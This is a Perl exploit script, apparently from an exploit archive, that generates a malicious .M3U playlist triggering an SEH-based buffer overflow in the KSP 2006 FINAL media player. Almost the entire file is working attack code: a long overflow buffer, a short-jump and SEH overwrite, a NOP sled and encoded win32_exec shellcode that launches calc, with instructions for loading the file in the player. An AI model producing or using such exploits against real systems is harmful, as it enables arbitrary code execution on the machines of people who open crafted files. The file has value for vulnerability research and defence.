#!/usr/bin/perl
# by hack4love
# hack4love@hotmail.com
# KSP 2006 FINAL ( .M3U) Universal Local Buffer Exploit (SEH)
# http://download.cnet.com/KSP/3000-2139_4-10540099.html?tag=mncol
# ## easy #### this work sooooooooo good############################
####################################################################
# USE>>KSP>>PLAYLIST>>LOAD>>HACK4LOVE.M3U>> >BOOM CALC
####################################################################
# INFO::WE HAVE ONLEY 192 BIT FOR shellcode SO I USE
## win32_exec - EXITFUNC=seh CMD=calc Size=160 Encoder=PexFnstenvSub
#####################################################################
###HAPEY _________RAMADAN############################################
#####################################################################
my $bof="\x41" x 2385;
my $nsh="\xEB\x06\x90\x90";
my $seh="\x38\x01\x6e\x74";#### Universal
my $nop="\x90" x 20;
my $sec=
"\x2b\xc9\x83\xe9\xde\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\xc2".
"\xf8\x23\x02\x83\xeb\xfc\xe2\xf4\x3e\x10\x67\x02\xc2\xf8\xa8\x47".
"\xfe\x73\x5f\x07\xba\xf9\xcc\x89\x8d\xe0\xa8\x5d\xe2\xf9\xc8\x4b".
"\x49\xcc\xa8\x03\x2c\xc9\xe3\x9b\x6e\x7c\xe3\x76\xc5\x39\xe9\x0f".
"\xc3\x3a\xc8\xf6\xf9\xac\x07\x06\xb7\x1d\xa8\x5d\xe6\xf9\xc8\x64".
"\x49\xf4\x68\x89\x9d\xe4\x22\xe9\x49\xe4\xa8\x03\x29\x71\x7f\x26".
"\xc6\x3b\x12\xc2\xa6\x73\x63\x32\x47\x38\x5b\x0e\x49\xb8\x2f\x89".
"\xb2\xe4\x8e\x89\xaa\xf0\xc8\x0b\x49\x78\x93\x02\xc2\xf8\xa8\x6a".
"\xfe\xa7\x12\xf4\xa2\xae\xaa\xfa\x41\x38\x58\x52\xaa\x08\xa9\x06".
"\x9d\x90\xbb\xfc\x48\xf6\x74\xfd\x25\x9b\x42\x6e\xa1\xf8\x23\x02";
print $bof.$nsh.$seh.$nop.$sec;
###################################################################
open(myfile,'>> HACK4LOVE.M3U');
print myfile $bof.$nsh.$seh.$nop.$sec;
###################################################################